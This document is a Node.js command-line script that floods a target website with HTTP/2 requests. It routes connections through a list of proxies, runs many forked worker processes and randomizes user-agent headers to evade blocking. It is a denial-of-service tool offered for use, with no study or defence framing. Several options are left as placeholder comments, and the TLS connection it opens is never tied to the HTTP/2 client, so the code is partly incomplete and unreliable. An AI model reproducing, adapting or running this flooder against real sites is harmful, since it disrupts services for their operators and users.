const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");
const { HeaderGenerator } = require('header-generator');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) {
    console.log(`node tlsx.js target time rate thread proxy.txt`);
    process.exit();
}

const headers = {
    // Define your headers here
};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

let headerGenerator = new HeaderGenerator({
    // Define your header generator options here
});

function stopFlooder() {
    console.log("Stopping...");
    process.exit();
}

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1000);
    setTimeout(stopFlooder, args.time * 1000);
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const userAgentv2 = new UserAgent();
    var useragent = userAgentv2.toString();
    headers["user-agent"] = useragent;

    // Other headers

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100
    };

    const connection = net.connect(proxyOptions.port, proxyOptions.host, () => {
        connection.write("CONNECT " + proxyOptions.address + ":443 HTTP/1.1\r\n" +
            "Host: " + proxyOptions.address + ":443\r\n" +
            "Connection: Keep-Alive\r\n\r\n");
    });

    connection.on("data", (chunk) => {
        const response = chunk.toString("utf-8");
        const isAlive = response.includes("HTTP/1.1 200");
        if (!isAlive) {
            connection.destroy();
        } else {
            const tlsOptions = {
                // Define your TLS options here
            };

            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

            const client = http2.connect(parsedTarget.href, {
                // Define your HTTP/2 client options here
            });

            client.on("connect", () => {
                const intervalAttack = setInterval(() => {
                    for (let i = 0; i < args.rate; i++) {
                        const request = client.request(headers);
                        request.on("response", (response) => {
                            request.close();
                            request.destroy();
                        });
                        request.end();
                    }
                }, 1000);
            });

            client.on("close", () => {
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
            });

            client.on("error", () => {
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
            });
        }
    });
}

const killScript = () => process.exit(1);

setTimeout(killScript, args.time * 1000);
